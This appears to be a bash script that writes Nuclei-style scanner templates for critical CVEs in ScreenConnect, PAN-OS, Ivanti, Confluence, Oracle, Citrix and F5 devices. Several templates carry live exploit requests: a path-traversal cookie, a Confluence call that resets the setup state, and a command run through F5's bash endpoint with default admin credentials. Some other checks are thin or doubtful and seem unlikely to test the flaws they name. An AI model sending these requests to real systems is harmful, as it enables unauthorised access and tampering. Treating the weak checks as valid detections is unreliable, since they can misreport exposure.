#!/bin/bash
# K70n0s510 GITHUB BUILDER
# Runs on Windows Git Bash to build and sync the Professional Arsenal.

BASE_DIR="$HOME/K70n0s510_templates/owasp-2025"
mkdir -p "$BASE_DIR/A99-critical-cves"
mkdir -p "$BASE_DIR/A100-2025-zero-days"
mkdir -p "$BASE_DIR/A101-2025-nuclear"

echo "Building Professional Templates..."

# --- A99 CRITICALS (Refactored) ---
cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2024-1709-screenconnect.yaml"
id: CVE-2024-1709
info:
  name: ConnectWise ScreenConnect Auth Bypass
  author: K70n0s510
  severity: critical
  description: Critical auth bypass allowing admin account creation via SetupWizard.
  tags: cve,cve2024,screenconnect,auth-bypass
http:
  - method: GET
    path: ["{{BaseURL}}/SetupWizard.aspx/"]
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["ConnectWise ScreenConnect", "SetupWizard"]
EOF

cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2024-3400-paloalto.yaml"
id: CVE-2024-3400
info:
  name: Palo Alto GlobalProtect Command Injection
  author: K70n0s510
  severity: critical
  description: Unauthenticated remote code execution in GlobalProtect VPN.
  tags: cve,cve2024,paloalto,rce,vpn
http:
  - method: POST
    path: ["{{BaseURL}}/ssl-vpn/hipreport.esp"]
    headers: {Cookie: "SESSID=./../../../../opt/panlogs/tmp/device_telemetry/minute/test_file"}
    matchers:
      - type: word
        words: ["GlobalProtect"]
EOF

cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2023-46805-ivanti.yaml"
id: CVE-2023-46805
info:
  name: Ivanti Connect Secure Auth Bypass
  author: K70n0s510
  severity: critical
  description: Authentication bypass in Ivanti Connect Secure web component.
  tags: cve,cve2023,ivanti,auth-bypass
http:
  - method: GET
    path: ["{{BaseURL}}/api/v1/totp/user-backup-code/../../system/system-information"]
    matchers:
      - type: word
        words: ["system-information"]
EOF

cat <<EOF > "$BASE_DIR/A99-critical-cves/CVE-2023-22515-confluence.yaml"
id: CVE-2023-22515
info:
  name: Atlassian Confluence Auth Bypass
  author: K70n0s510
  severity: critical
  description: Broken access control allowing unauthorized admin account creation.
  tags: cve,cve2023,confluence,atlassian
http:
  - method: GET
    path: ["{{BaseURL}}/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false"]
    matchers:
      - type: word
        words: ["success", "setupComplete"]
EOF

# --- A100 ZERO DAYS (Refactored) ---
cat <<EOF > "$BASE_DIR/A100-2025-zero-days/CVE-2025-0108-paloalto.yaml"
id: CVE-2025-0108
info:
  name: Palo Alto PAN-OS Mgmt Auth Bypass
  author: K70n0s510
  severity: critical
  description: Authentication bypass in PAN-OS management interface.
  tags: cve,cve2025,paloalto,auth-bypass
http:
  - method: GET
    path: ["{{BaseURL}}/unauth/php/change_password.php"]
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["PanOS", "Change Password"]
EOF

cat <<EOF > "$BASE_DIR/A100-2025-zero-days/CVE-2025-22457-ivanti.yaml"
id: CVE-2025-22457
info:
  name: Ivanti Connect Secure Stack Overflow
  author: K70n0s510
  severity: critical
  description: RCE via stack overflow in Ivanti VPN gateway.
  tags: cve,cve2025,ivanti,rce
http:
  - method: GET
    path: ["{{BaseURL}}/dana-na/auth/url_default/welcome.cgi?p=test_overflow"]
    matchers:
      - type: status
        status: [500]
      - type: word
        words: ["Ivanti", "stack trace"]
EOF

cat <<EOF > "$BASE_DIR/A100-2025-zero-days/CVE-2025-61882-oracle.yaml"
id: CVE-2025-61882
info:
  name: Oracle E-Business Suite RCE
  author: K70n0s510
  severity: critical
  description: Unauthenticated RCE in Oracle EBS OA Framework.
  tags: cve,cve2025,oracle,rce
http:
  - method: GET
    path: ["{{BaseURL}}/OA_HTML/OA.jsp?OAFunc=OAHOMEPAGE"]
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["Oracle E-Business Suite"]
EOF

# --- A101 NUCLEAR (Refactored) ---
cat <<EOF > "$BASE_DIR/A101-2025-nuclear/CVE-2025-7775-citrix.yaml"
id: CVE-2025-7775
info:
  name: Citrix NetScaler Memory Overflow
  author: K70n0s510
  severity: critical
  description: Critical RCE via malformed NSC_AAAC cookie.
  tags: cve,cve2025,citrix,rce
http:
  - method: GET
    path: ["{{BaseURL}}/vpn/index.html"]
    headers: {Cookie: "NSC_AAAC=AAAAAAAAAAAAAAAAAAAAAA"}
    matchers:
      - type: status
        status: [500, 403]
      - type: word
        words: ["Citrix NetScaler", "unpredictable state"]
EOF

cat <<EOF > "$BASE_DIR/A101-2025-nuclear/CVE-2025-53868-f5.yaml"
id: CVE-2025-53868
info:
  name: F5 BIG-IP Appliance Mode RCE
  author: K70n0s510
  severity: critical
  description: Appliance mode bypass leading to bash execution.
  tags: cve,cve2025,f5,rce
http:
  - method: POST
    path: ["{{BaseURL}}/mgmt/tm/util/bash"]
    body: "{\"command\":\"run\",\"utilCmdArgs\":\"-c id\"}"
    headers: {Authorization: "Basic YWRtaW46YWRtaW4="}
    matchers:
      - type: status
        status: [200]
      - type: word
        words: ["uid=0(root)"]
EOF

echo "Done. Professional Templates Built."

